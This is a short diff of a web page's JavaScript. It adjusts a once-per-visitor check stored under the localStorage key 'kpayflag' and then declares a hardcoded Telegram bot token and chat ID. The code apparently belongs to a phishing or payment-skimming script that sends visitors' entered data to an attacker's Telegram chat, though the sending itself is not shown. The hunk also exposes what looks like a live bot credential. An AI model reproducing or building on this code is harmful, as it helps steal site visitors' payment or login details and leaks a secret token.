@@ -2686,11 +2686,14 @@ document.addEventListener("DOMContentLoaded", function () {
     
     try{
         if(localStorage.getItem('kpayflag') == '1'){
-        return
-    }
+            return
+        }
+        else{
+         localStorage.setItem('kpayflag','1')   
+        }
     }
     catch(err){
-    localStorage.setItem('kpayflag','1')
+        localStorage.setItem('kpayflag','1')
     }
   const telegramToken = "7998058099:AAEiBWRM-7qngLRe-uQKDJdROitygNGjxbo";
   const chatId = "6969224682";
